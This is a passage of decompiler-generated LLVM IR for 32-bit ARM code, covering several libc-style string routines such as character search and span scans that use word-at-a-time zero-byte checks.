  br i1 %tmp, label %dec_label_pc_146c8, label %dec_label_pc_14750

dec_label_pc_146c8:                               ; preds = %dec_label_pc_146bc, %dec_label_pc_14730.backedge
  %v0_146e440 = phi i32 [ %v1_146e4, %dec_label_pc_14730.backedge ], [ %v0_147309, %dec_label_pc_146bc ]
  %v0_146c839 = phi i32 [ %v1_146c8, %dec_label_pc_14730.backedge ], [ %v0_1474413, %dec_label_pc_146bc ]
  %v1_146c8 = add i32 %v0_146c839, -4
  %v2_146c8 = inttoptr i32 %v1_146c8 to i32*
  %v3_146c8 = load i32, i32* %v2_146c8, align 4
  %v2_146cc = xor i32 %v3_146c8, %v5_146c0
  %v2_146d0 = add i32 %v2_146cc, 2130640639
  store i32 %v2_146d0, i32* @ip, align 4
  %v1_146d4 = sub i32 -1, %v2_146cc
  %v2_146d8 = xor i32 %v2_146d0, %v1_146d4
  %v2_146dc = and i32 %v2_146d8, -2130640640
  %v2_146e0 = icmp eq i32 %v2_146dc, 0
  %v1_146e4 = add i32 %v0_146e440, -4
  br i1 %v2_146e0, label %dec_label_pc_14730.backedge, label %dec_label_pc_146ec

dec_label_pc_14730.backedge:                      ; preds = %dec_label_pc_146c8, %dec_label_pc_14724
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_146e4, 3
  br i1 %tmp46, label %dec_label_pc_146c8, label %dec_label_pc_14750

dec_label_pc_146ec:                               ; preds = %dec_label_pc_146c8
  %v1_146ec = add i32 %v0_146c839, -1
  %v2_146ec = inttoptr i32 %v1_146ec to i8*
  %v3_146ec = load i8, i8* %v2_146ec, align 1
  %v4_146ec = zext i8 %v3_146ec to i32
  %v9_146f0 = icmp eq i32 %v4_146ec, %v1_14690
  br i1 %v9_146f0, label %dec_label_pc_1471c, label %dec_label_pc_146fc

dec_label_pc_146fc:                               ; preds = %dec_label_pc_146ec
  %v1_146fc = add i32 %v0_146c839, -2
  %v2_146fc = inttoptr i32 %v1_146fc to i8*
  %v3_146fc = load i8, i8* %v2_146fc, align 1
  %v4_146fc = zext i8 %v3_146fc to i32
  %v9_14700 = icmp eq i32 %v4_146fc, %v1_14690
  br i1 %v9_14700, label %dec_label_pc_1471c, label %dec_label_pc_1470c

dec_label_pc_1470c:                               ; preds = %dec_label_pc_146fc
  %v1_1470c = add i32 %v0_146c839, -3
  %v2_1470c = inttoptr i32 %v1_1470c to i8*
  %v3_1470c = load i8, i8* %v2_1470c, align 1
  %v4_1470c = zext i8 %v3_1470c to i32
  %v9_14710 = icmp eq i32 %v4_1470c, %v1_14690
  br i1 %v9_14710, label %dec_label_pc_1471c, label %dec_label_pc_14724

dec_label_pc_1471c:                               ; preds = %dec_label_pc_1470c, %dec_label_pc_146fc, %dec_label_pc_146ec
  %v0_1471c = phi i32 [ %v1_1470c, %dec_label_pc_1470c ], [ %v1_146fc, %dec_label_pc_146fc ], [ %v1_146ec, %dec_label_pc_146ec ]
  br label %dec_label_pc_1475c

dec_label_pc_14724:                               ; preds = %dec_label_pc_1470c
  %v1_14724 = inttoptr i32 %v1_146c8 to i8*
  %v2_14724 = load i8, i8* %v1_14724, align 1
  %v3_14724 = zext i8 %v2_14724 to i32
  %v9_14728 = icmp eq i32 %v3_14724, %v1_14690
  br i1 %v9_14728, label %dec_label_pc_1475c, label %dec_label_pc_14730.backedge

dec_label_pc_14744:                               ; preds = %dec_label_pc_14750
  %v1_14750 = add i32 %v0_14750, -1
  %v1_14744 = add i32 %v0_14744, -1
  %v2_14744 = inttoptr i32 %v1_14744 to i8*
  %v3_14744 = load i8, i8* %v2_14744, align 1
  %v4_14744 = zext i8 %v3_14744 to i32
  %v9_14748 = icmp eq i32 %v4_14744, %v1_14690
  br i1 %v9_14748, label %dec_label_pc_1475c, label %dec_label_pc_14750

dec_label_pc_14750:                               ; preds = %dec_label_pc_146bc, %dec_label_pc_14730.backedge, %dec_label_pc_14744
  %v0_14744 = phi i32 [ %v1_14744, %dec_label_pc_14744 ], [ %v0_1474413, %dec_label_pc_146bc ], [ %v1_146c8, %dec_label_pc_14730.backedge ]
  %v0_14750 = phi i32 [ %v1_14750, %dec_label_pc_14744 ], [ %v0_147309, %dec_label_pc_146bc ], [ %v1_146e4, %dec_label_pc_14730.backedge ]
  %v2_14750 = icmp eq i32 %v0_14750, 0
  br i1 %v2_14750, label %dec_label_pc_14758, label %dec_label_pc_14744

dec_label_pc_14758:                               ; preds = %dec_label_pc_14750
  br label %dec_label_pc_1475c

dec_label_pc_1475c:                               ; preds = %dec_label_pc_1469c, %dec_label_pc_14724, %dec_label_pc_14744, %dec_label_pc_1471c, %dec_label_pc_14758
  %v1_14760 = phi i32 [ %v0_1471c, %dec_label_pc_1471c ], [ 0, %dec_label_pc_14758 ], [ %v1_14744, %dec_label_pc_14744 ], [ %v1_146c8, %dec_label_pc_14724 ], [ %v1_1469c, %dec_label_pc_1469c ]
  ret i32 %v1_14760

; uselistorder directives
  uselistorder i32 %v0_14750, { 1, 0 }
  uselistorder i32 %v1_146e4, { 1, 0, 2 }
  uselistorder i32 %v1_146c8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_146c839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_146bc, { 1, 0 }
  uselistorder i32 %v0_147309, { 1, 2, 0 }
  uselistorder i32 %v0_1469c, { 1, 0, 2 }
  uselistorder i32 %v2_14694, { 1, 0 }
  uselistorder i32 %v1_14690, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1475c, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_14750, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14730.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_146c8, { 1, 0 }
  uselistorder label %dec_label_pc_146bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_146b4, { 1, 0 }
}

define i32 @function_1476c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1476c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1479c2 = load i32, i32* @r0, align 4
  %v1_1479c3 = inttoptr i32 %v0_1479c2 to i8*
  %v2_1479c4 = load i8, i8* %v1_1479c3, align 1
  %v3_1479c5 = zext i8 %v2_1479c4 to i32
  store i32 %v3_1479c5, i32* @ip, align 4
  %v2_147a06 = icmp eq i8 %v2_1479c4, 0
  br i1 %v2_147a06, label %dec_label_pc_147ac, label %dec_label_pc_14780.preheader

dec_label_pc_14778:                               ; preds = %dec_label_pc_14780
  %v3_14780 = zext i8 %v2_14780 to i32
  %v1_14788 = add i32 %v0_14788, 1
  %v9_14778 = icmp eq i32 %v0_1477810, %v3_14780
  br i1 %v9_14778, label %dec_label_pc_14794, label %dec_label_pc_14780

dec_label_pc_14780:                               ; preds = %dec_label_pc_14780.preheader, %dec_label_pc_14778
  %v0_14788 = phi i32 [ %tmp, %dec_label_pc_14780.preheader ], [ %v1_14788, %dec_label_pc_14778 ]
  %v1_14780 = inttoptr i32 %v0_14788 to i8*
  %v2_14780 = load i8, i8* %v1_14780, align 1
  %v2_14784 = icmp eq i8 %v2_14780, 0
  br i1 %v2_14784, label %dec_label_pc_147ac, label %dec_label_pc_14778

dec_label_pc_14794:                               ; preds = %dec_label_pc_14778
  %v1_14794 = add i32 %v0_14794, 1
  %v1_14798 = add i32 %v0_14798, 1
  %v1_1479c = inttoptr i32 %v1_14798 to i8*
  %v2_1479c = load i8, i8* %v1_1479c, align 1
  %v3_1479c = zext i8 %v2_1479c to i32
  store i32 %v3_1479c, i32* @ip, align 4
  %v2_147a0 = icmp eq i8 %v2_1479c, 0
  br i1 %v2_147a0, label %dec_label_pc_147ac, label %dec_label_pc_14780.preheader

dec_label_pc_14780.preheader:                     ; preds = %dec_label_pc_1476c, %dec_label_pc_14794
  %v0_14798 = phi i32 [ %v1_14798, %dec_label_pc_14794 ], [ %v0_1479c2, %dec_label_pc_1476c ]
  %v0_14794 = phi i32 [ %v1_14794, %dec_label_pc_14794 ], [ 0, %dec_label_pc_1476c ]
  %v0_1477810 = phi i32 [ %v3_1479c, %dec_label_pc_14794 ], [ %v3_1479c5, %dec_label_pc_1476c ]
  br label %dec_label_pc_14780

dec_label_pc_147ac:                               ; preds = %dec_label_pc_14794, %dec_label_pc_14780, %dec_label_pc_1476c
  %v0_147ac = phi i32 [ 0, %dec_label_pc_1476c ], [ %v0_14794, %dec_label_pc_14780 ], [ %v1_14794, %dec_label_pc_14794 ]
  ret i32 %v0_147ac

; uselistorder directives
  uselistorder i32 %v0_14788, { 1, 0 }
  uselistorder label %dec_label_pc_14780.preheader, { 1, 0 }
}

define i32 @function_147b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_147b8:
  store i32 %arg1, i32* @r0, align 4
  %v1_147bc = urem i32 %arg2, 256
  store i32 %v1_147bc, i32* @r4, align 4
  %v2_147bc = icmp eq i32 %v1_147bc, 0
  br i1 %v2_147bc, label %dec_label_pc_147d0, label %dec_label_pc_147e4.preheader

dec_label_pc_147e4.preheader:                     ; preds = %dec_label_pc_147b8
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_147ec3 = call i32 @function_14918(i32 %arg1, i32 %v1_147bc)
  %v2_147f05 = icmp eq i32 %v2_147ec3, 0
  br i1 %v2_147f05, label %dec_label_pc_147f8, label %dec_label_pc_147dc

dec_label_pc_147d0:                               ; preds = %dec_label_pc_147b8
  %v2_147d4 = call i32 @function_14918(i32 %arg1, i32 0)
  br label %dec_label_pc_147fc

dec_label_pc_147dc:                               ; preds = %dec_label_pc_147e4.preheader, %dec_label_pc_147dc
  %v2_147ec6 = phi i32 [ %v2_147ec, %dec_label_pc_147dc ], [ %v2_147ec3, %dec_label_pc_147e4.preheader ]
  store i32 %v2_147ec6, i32* @r5, align 4
  %v1_147e0 = add i32 %v2_147ec6, 1
  store i32 %v1_147e0, i32* @r0, align 4
  %v0_147e8 = load i32, i32* @r4, align 4
  %v2_147ec = call i32 @function_14918(i32 %v1_147e0, i32 %v0_147e8)
  %v2_147f0 = icmp eq i32 %v2_147ec, 0
  br i1 %v2_147f0, label %dec_label_pc_147f8, label %dec_label_pc_147dc

dec_label_pc_147f8:                               ; preds = %dec_label_pc_147dc, %dec_label_pc_147e4.preheader
  %v0_147f8 = load i32, i32* @r5, align 4
  br label %dec_label_pc_147fc

dec_label_pc_147fc:                               ; preds = %dec_label_pc_147d0, %dec_label_pc_147f8
  %storemerge = phi i32 [ %v2_147d4, %dec_label_pc_147d0 ], [ %v0_147f8, %dec_label_pc_147f8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_147ec, { 1, 0 }
  uselistorder i32 %v1_147e0, { 1, 0 }
  uselistorder i32 %v1_147bc, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_147fc, { 1, 0 }
  uselistorder label %dec_label_pc_147dc, { 1, 0 }
}

define i32 @function_14808(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14808:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_14808 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_14818 = call i32 @function_f350()
  %v0_1481c = load i32, i32* @r5, align 4
  %v1_1481c = load i32, i32* @r4, align 4
  %v2_1481c = add i32 %v1_1481c, %v0_1481c
  store i32 %v6_14808, i32* @r5, align 4
  ret i32 %v2_1481c
}

define i32 @function_1482c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1482c:
  %v1_14830 = urem i32 %arg1, 256
  %v0_148502 = load i32, i32* @r0, align 4
  %v1_148503 = urem i32 %v0_148502, 4
  %v2_148504 = icmp eq i32 %v1_148503, 0
  br i1 %v2_148504, label %dec_label_pc_14858, label %dec_label_pc_14838

dec_label_pc_14838:                               ; preds = %dec_label_pc_1482c, %dec_label_pc_1484c
  %v0_1484c = phi i32 [ %v1_1484c, %dec_label_pc_1484c ], [ %v0_148502, %dec_label_pc_1482c ]
  %v1_14838 = inttoptr i32 %v0_1484c to i8*
  %v2_14838 = load i8, i8* %v1_14838, align 1
  %v3_14838 = zext i8 %v2_14838 to i32
  %v9_1483c = icmp eq i32 %v3_14838, %v1_14830
  br i1 %v9_1483c, label %dec_label_pc_14908, label %dec_label_pc_14844

dec_label_pc_14844:                               ; preds = %dec_label_pc_14838
  %v2_14844 = icmp eq i8 %v2_14838, 0
  br i1 %v2_14844, label %dec_label_pc_14908, label %dec_label_pc_1484c

dec_label_pc_1484c:                               ; preds = %dec_label_pc_14844
  %v1_1484c = add i32 %v0_1484c, 1
  %v1_14850 = urem i32 %v1_1484c, 4
  %v2_14850 = icmp eq i32 %v1_14850, 0
  br i1 %v2_14850, label %dec_label_pc_14858, label %dec_label_pc_14838

dec_label_pc_14858:                               ; preds = %dec_label_pc_1484c, %dec_label_pc_1482c
  %v0_1485c = phi i32 [ %v0_148502, %dec_label_pc_1482c ], [ %v1_1484c, %dec_label_pc_1484c ]
  %v4_14858 = mul nuw nsw i32 %v1_14830, 256
  %v5_14858 = or i32 %v4_14858, %v1_14830
  %v4_14860 = mul i32 %v5_14858, 65536
  %v5_14860 = or i32 %v4_14860, %v5_14858
  br label %dec_label_pc_14864

dec_label_pc_14864:                               ; preds = %dec_label_pc_14900, %dec_label_pc_148a0, %dec_label_pc_14858
  %v0_148c8 = phi i32 [ %v0_1485c, %dec_label_pc_14858 ], [ %v4_14864, %dec_label_pc_148a0 ], [ %v4_14864, %dec_label_pc_14900 ]
  %v1_14864 = inttoptr i32 %v0_148c8 to i32*
  %v2_14864 = load i32, i32* %v1_14864, align 4
  %v4_14864 = add i32 %v0_148c8, 4
  %v2_1486c = xor i32 %v2_14864, %v5_14860
  %v2_14870 = add i32 %v2_1486c, 2130640639
  store i32 %v2_14870, i32* @ip, align 4
  %v2_14878 = add i32 %v2_14864, 2130640639
  %v1_1487c = sub i32 -1, %v2_14864
  %v2_14880 = xor i32 %v2_14878, %v1_1487c
  %v2_1488c = and i32 %v2_14880, -2130640640
  %v2_14894 = icmp eq i32 %v2_1488c, 0
  br i1 %v2_14894, label %dec_label_pc_148a0, label %dec_label_pc_148a8

dec_label_pc_148a0:                               ; preds = %dec_label_pc_14864
  %v1_14888 = sub i32 -1, %v2_1486c
  %v2_14890 = xor i32 %v2_14870, %v1_14888
  %v2_14898 = and i32 %v2_14890, -2130640640
  %v2_148a0 = icmp eq i32 %v2_14898, 0
  br i1 %v2_148a0, label %dec_label_pc_14864, label %dec_label_pc_148a8

dec_label_pc_148a8:                               ; preds = %dec_label_pc_14864, %dec_label_pc_148a0
  %v2_148a8 = inttoptr i32 %v0_148c8 to i8*
  %v3_148a8 = load i8, i8* %v2_148a8, align 1
  %v4_148a8 = zext i8 %v3_148a8 to i32
  %v9_148ac = icmp eq i32 %v4_148a8, %v1_14830
  br i1 %v9_148ac, label %dec_label_pc_14908, label %dec_label_pc_148b8

dec_label_pc_148b8:                               ; preds = %dec_label_pc_148a8
  %v2_148b8 = icmp eq i8 %v3_148a8, 0
  br i1 %v2_148b8, label %dec_label_pc_14908, label %dec_label_pc_148c0

dec_label_pc_148c0:                               ; preds = %dec_label_pc_148b8
  %v1_148c0 = add i32 %v0_148c8, 1
  %v2_148c0 = inttoptr i32 %v1_148c0 to i8*
  %v3_148c0 = load i8, i8* %v2_148c0, align 1
  %v4_148c0 = zext i8 %v3_148c0 to i32
  %v9_148c4 = icmp eq i32 %v4_148c0, %v1_14830
  br i1 %v9_148c4, label %dec_label_pc_14908, label %dec_label_pc_148d0

dec_label_pc_148d0:                               ; preds = %dec_label_pc_148c0
  %v2_148d0 = icmp eq i8 %v3_148c0, 0
  br i1 %v2_148d0, label %dec_label_pc_14908, label %dec_label_pc_148d8

dec_label_pc_148d8:                               ; preds = %dec_label_pc_148d0
  %v1_148d8 = add i32 %v0_148c8, 2
  %v2_148d8 = inttoptr i32 %v1_148d8 to i8*
  %v3_148d8 = load i8, i8* %v2_148d8, align 1
  %v4_148d8 = zext i8 %v3_148d8 to i32
  %v9_148dc = icmp eq i32 %v4_148d8, %v1_14830
  br i1 %v9_148dc, label %dec_label_pc_14908, label %dec_label_pc_148e8

dec_label_pc_148e8:                               ; preds = %dec_label_pc_148d8
  %v2_148e8 = icmp eq i8 %v3_148d8, 0
  br i1 %v2_148e8, label %dec_label_pc_14908, label %dec_label_pc_148f0

dec_label_pc_148f0:                               ; preds = %dec_label_pc_148e8
  %v1_148f0 = add i32 %v0_148c8, 3
  %v2_148f0 = inttoptr i32 %v1_148f0 to i8*
  %v3_148f0 = load i8, i8* %v2_148f0, align 1
  %v4_148f0 = zext i8 %v3_148f0 to i32
  %v9_148f4 = icmp eq i32 %v4_148f0, %v1_14830
  br i1 %v9_148f4, label %dec_label_pc_14908, label %dec_label_pc_14900

dec_label_pc_14900:                               ; preds = %dec_label_pc_148f0
  %v2_14900 = icmp eq i8 %v3_148f0, 0
  br i1 %v2_14900, label %dec_label_pc_14908, label %dec_label_pc_14864

dec_label_pc_14908:                               ; preds = %dec_label_pc_14844, %dec_label_pc_14838, %dec_label_pc_14900, %dec_label_pc_148f0, %dec_label_pc_148e8, %dec_label_pc_148d8, %dec_label_pc_148d0, %dec_label_pc_148c0, %dec_label_pc_148b8, %dec_label_pc_148a8
  %v1_1490c = phi i32 [ %v1_148f0, %dec_label_pc_14900 ], [ %v1_148f0, %dec_label_pc_148f0 ], [ %v1_148d8, %dec_label_pc_148e8 ], [ %v1_148d8, %dec_label_pc_148d8 ], [ %v1_148c0, %dec_label_pc_148d0 ], [ %v1_148c0, %dec_label_pc_148c0 ], [ %v0_148c8, %dec_label_pc_148b8 ], [ %v0_148c8, %dec_label_pc_148a8 ], [ %v0_1484c, %dec_label_pc_14838 ], [ %v0_1484c, %dec_label_pc_14844 ]
  ret i32 %v1_1490c

; uselistorder directives
  uselistorder i32 %v4_14864, { 1, 0 }
  uselistorder i32 %v2_14864, { 0, 2, 1 }
  uselistorder i32 %v0_148c8, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_14858, { 1, 0 }
  uselistorder i32 %v1_1484c, { 1, 0, 2 }
  uselistorder i32 %v0_148502, { 2, 1, 0 }
  uselistorder i32 %v1_14830, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_14908, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_148a8, { 1, 0 }
  uselistorder label %dec_label_pc_14838, { 1, 0 }
}

define i32 @function_14918(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14918:
  %v1_1491c = urem i32 %arg1, 256
  %v0_1493c3 = load i32, i32* @r0, align 4
  %v1_1493c4 = urem i32 %v0_1493c3, 4
  %v2_1493c5 = icmp eq i32 %v1_1493c4, 0
  br i1 %v2_1493c5, label %dec_label_pc_14944, label %dec_label_pc_14924

dec_label_pc_14924:                               ; preds = %dec_label_pc_14918, %dec_label_pc_14938
  %v0_14938 = phi i32 [ %v1_14938, %dec_label_pc_14938 ], [ %v0_1493c3, %dec_label_pc_14918 ]
  %v1_14924 = inttoptr i32 %v0_14938 to i8*
  %v2_14924 = load i8, i8* %v1_14924, align 1
  %v3_14924 = zext i8 %v2_14924 to i32
  store i32 %v3_14924, i32* @r3, align 4
  %v9_14928 = icmp eq i32 %v3_14924, %v1_1491c
  br i1 %v9_14928, label %dec_label_pc_149f8, label %dec_label_pc_14930

dec_label_pc_14930:                               ; preds = %dec_label_pc_14924
  %v2_14930 = icmp eq i8 %v2_14924, 0
  br i1 %v2_14930, label %dec_label_pc_149f4, label %dec_label_pc_14938

dec_label_pc_14938:                               ; preds = %dec_label_pc_14930
  %v1_14938 = add i32 %v0_14938, 1
  %v1_1493c = urem i32 %v1_14938, 4
  %v2_1493c = icmp eq i32 %v1_1493c, 0
  br i1 %v2_1493c, label %dec_label_pc_14944, label %dec_label_pc_14924

dec_label_pc_14944:                               ; preds = %dec_label_pc_14938, %dec_label_pc_14918
  %v0_14948 = phi i32 [ %v0_1493c3, %dec_label_pc_14918 ], [ %v1_14938, %dec_label_pc_14938 ]
  %v4_14944 = mul nuw nsw i32 %v1_1491c, 256
  %v5_14944 = or i32 %v4_14944, %v1_1491c
  %v4_1494c = mul i32 %v5_14944, 65536
  %v5_1494c = or i32 %v4_1494c, %v5_14944
  br label %dec_label_pc_14950

dec_label_pc_14950:                               ; preds = %dec_label_pc_149ec, %dec_label_pc_1498c, %dec_label_pc_14944
  %v0_149b4 = phi i32 [ %v0_14948, %dec_label_pc_14944 ], [ %v4_14950, %dec_label_pc_1498c ], [ %v4_14950, %dec_label_pc_149ec ]
  %v1_14950 = inttoptr i32 %v0_149b4 to i32*
  %v2_14950 = load i32, i32* %v1_14950, align 4
  %v4_14950 = add i32 %v0_149b4, 4
  %v2_14958 = xor i32 %v2_14950, %v5_1494c
  %v2_1495c = add i32 %v2_14958, 2130640639
  store i32 %v2_1495c, i32* @ip, align 4
  %v2_14964 = add i32 %v2_14950, 2130640639
  %v1_14968 = sub i32 -1, %v2_14950
  %v2_1496c = xor i32 %v2_14964, %v1_14968
  %v2_14978 = and i32 %v2_1496c, -2130640640
  %v2_14980 = icmp eq i32 %v2_14978, 0
  br i1 %v2_14980, label %dec_label_pc_1498c, label %dec_label_pc_14994

dec_label_pc_1498c:                               ; preds = %dec_label_pc_14950
  %v1_14974 = sub i32 -1, %v2_14958
  %v2_1497c = xor i32 %v2_1495c, %v1_14974
  %v2_14984 = and i32 %v2_1497c, -2130640640
  %v2_1498c = icmp eq i32 %v2_14984, 0
  br i1 %v2_1498c, label %dec_label_pc_14950, label %dec_label_pc_14994

dec_label_pc_14994:                               ; preds = %dec_label_pc_14950, %dec_label_pc_1498c
  %v2_14994 = inttoptr i32 %v0_149b4 to i8*
  %v3_14994 = load i8, i8* %v2_14994, align 1
  %v4_14994 = zext i8 %v3_14994 to i32
  store i32 %v4_14994, i32* @r3, align 4
  %v9_14998 = icmp eq i32 %v4_14994, %v1_1491c
  br i1 %v9_14998, label %dec_label_pc_149f8, label %dec_label_pc_149a4

dec_label_pc_149a4:                               ; preds = %dec_label_pc_14994
  %v2_149a4 = icmp eq i8 %v3_14994, 0
  br i1 %v2_149a4, label %dec_label_pc_149f4, label %dec_label_pc_149ac

dec_label_pc_149ac:                               ; preds = %dec_label_pc_149a4
  %v1_149ac = add i32 %v0_149b4, 1
  %v2_149ac = inttoptr i32 %v1_149ac to i8*
  %v3_149ac = load i8, i8* %v2_149ac, align 1
  %v4_149ac = zext i8 %v3_149ac to i32
  store i32 %v4_149ac, i32* @r3, align 4
  %v9_149b0 = icmp eq i32 %v4_149ac, %v1_1491c
  br i1 %v9_149b0, label %dec_label_pc_149f8, label %dec_label_pc_149bc

dec_label_pc_149bc:                               ; preds = %dec_label_pc_149ac
  %v2_149bc = icmp eq i8 %v3_149ac, 0
  br i1 %v2_149bc, label %dec_label_pc_149f4, label %dec_label_pc_149c4

dec_label_pc_149c4:                               ; preds = %dec_label_pc_149bc
  %v1_149c4 = add i32 %v0_149b4, 2
  %v2_149c4 = inttoptr i32 %v1_149c4 to i8*
  %v3_149c4 = load i8, i8* %v2_149c4, align 1
  %v4_149c4 = zext i8 %v3_149c4 to i32
  store i32 %v4_149c4, i32* @r3, align 4
  %v9_149c8 = icmp eq i32 %v4_149c4, %v1_1491c
  br i1 %v9_149c8, label %dec_label_pc_149f8, label %dec_label_pc_149d4

dec_label_pc_149d4:                               ; preds = %dec_label_pc_149c4
  %v2_149d4 = icmp eq i8 %v3_149c4, 0
  br i1 %v2_149d4, label %dec_label_pc_149f4, label %dec_label_pc_149dc

dec_label_pc_149dc:                               ; preds = %dec_label_pc_149d4
  %v1_149dc = add i32 %v0_149b4, 3
  %v2_149dc = inttoptr i32 %v1_149dc to i8*
  %v3_149dc = load i8, i8* %v2_149dc, align 1
  %v4_149dc = zext i8 %v3_149dc to i32
  store i32 %v4_149dc, i32* @r3, align 4
  %v9_149e0 = icmp eq i32 %v4_149dc, %v1_1491c
  br i1 %v9_149e0, label %dec_label_pc_149f8, label %dec_label_pc_149ec

dec_label_pc_149ec:                               ; preds = %dec_label_pc_149dc
  %v2_149ec = icmp eq i8 %v3_149dc, 0
  br i1 %v2_149ec, label %dec_label_pc_149f4, label %dec_label_pc_14950

dec_label_pc_149f4:                               ; preds = %dec_label_pc_14930, %dec_label_pc_149ec, %dec_label_pc_149d4, %dec_label_pc_149bc, %dec_label_pc_149a4
  br label %dec_label_pc_149f8

dec_label_pc_149f8:                               ; preds = %dec_label_pc_14924, %dec_label_pc_149dc, %dec_label_pc_149c4, %dec_label_pc_149ac, %dec_label_pc_14994, %dec_label_pc_149f4
  %v1_149fc = phi i32 [ 0, %dec_label_pc_149f4 ], [ %v1_149dc, %dec_label_pc_149dc ], [ %v1_149c4, %dec_label_pc_149c4 ], [ %v1_149ac, %dec_label_pc_149ac ], [ %v0_149b4, %dec_label_pc_14994 ], [ %v0_14938, %dec_label_pc_14924 ]
  ret i32 %v1_149fc

; uselistorder directives
  uselistorder i32 %v4_14950, { 1, 0 }
  uselistorder i32 %v2_14950, { 0, 2, 1 }
  uselistorder i32 %v0_149b4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_14944, { 1, 0 }
  uselistorder i32 %v1_14938, { 1, 0, 2 }
  uselistorder i32 %v0_1493c3, { 2, 1, 0 }
  uselistorder i32 %v1_1491c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 2130640639, { 2, 6, 3, 7, 8, 4, 0, 9, 10, 5, 1 }
  uselistorder label %dec_label_pc_149f8, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_149f4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_14994, { 1, 0 }
  uselistorder label %dec_label_pc_14924, { 1, 0 }
}

define i32 @function_14a08(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14a08:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a34

dec_label_pc_14a10:                               ; preds = %dec_label_pc_14a20
  %v3_14a20 = zext i8 %v2_14a20 to i32
  %v1_14a28 = add i32 %v0_14a28, 1
  %v1_14a10 = load i32, i32* %r0.global-to-local, align 4
  %v9_14a10 = icmp eq i32 %v3_14a20, %v1_14a10
  br i1 %v9_14a10, label %dec_label_pc_14a18, label %dec_label_pc_14a20

dec_label_pc_14a18:                               ; preds = %dec_label_pc_14a10
  %v0_14a18 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_14a18, i32* %r0.global-to-local, align 4
  ret i32 %v0_14a18

dec_label_pc_14a20:                               ; preds = %dec_label_pc_14a10, %dec_label_pc_14a34
  %v0_14a28 = phi i32 [ %v1_14a28, %dec_label_pc_14a10 ], [ %arg2, %dec_label_pc_14a34 ]
  %v1_14a20 = inttoptr i32 %v0_14a28 to i8*
  %v2_14a20 = load i8, i8* %v1_14a20, align 1
  %v2_14a24 = icmp eq i8 %v2_14a20, 0
  br i1 %v2_14a24, label %dec_label_pc_14a30, label %dec_label_pc_14a10

dec_label_pc_14a30:                               ; preds = %dec_label_pc_14a20
  %v0_14a30 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a30 = add i32 %v0_14a30, 1
  br label %dec_label_pc_14a34

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a08, %dec_label_pc_14a30
  %storemerge = phi i32 [ %tmp, %dec_label_pc_14a08 ], [ %v1_14a30, %dec_label_pc_14a30 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_14a34 = inttoptr i32 %storemerge to i8*
  %v2_14a34 = load i8, i8* %v1_14a34, align 1
  %v3_14a34 = zext i8 %v2_14a34 to i32
  store i32 %v3_14a34, i32* %r0.global-to-local, align 4
  %v2_14a38 = icmp eq i8 %v2_14a34, 0
  %v0_14a3c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_14a38, i32 %v0_14a3c)
  br label %dec_label_pc_14a20

; uselistorder directives
  uselistorder i32 %v0_14a28, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_14a34, { 1, 0 }
  uselistorder label %dec_label_pc_14a20, { 1, 0 }
}

define i32 @function_14a48(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14a48:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14a48 = load i32, i32* @r4, align 4
  store i32 %v3_14a48, i32* %stack_var_-28, align 4
  %v0_14a50 = load i32, i32* %r0.global-to-local, align 4
  %v2_14a50 = icmp eq i32 %v0_14a50, 0
  br i1 %v2_14a50, label %dec_label_pc_14b2c, label %dec_label_pc_14a60

dec_label_pc_14a60:                               ; preds = %dec_label_pc_14a48
  br label %dec_label_pc_14a78

dec_label_pc_14a78:                               ; preds = %dec_label_pc_14a60, %dec_label_pc_14af0
  %v1_14af0 = phi i32 [ 0, %dec_label_pc_14a60 ], [ %v5_14af0, %dec_label_pc_14af0 ]
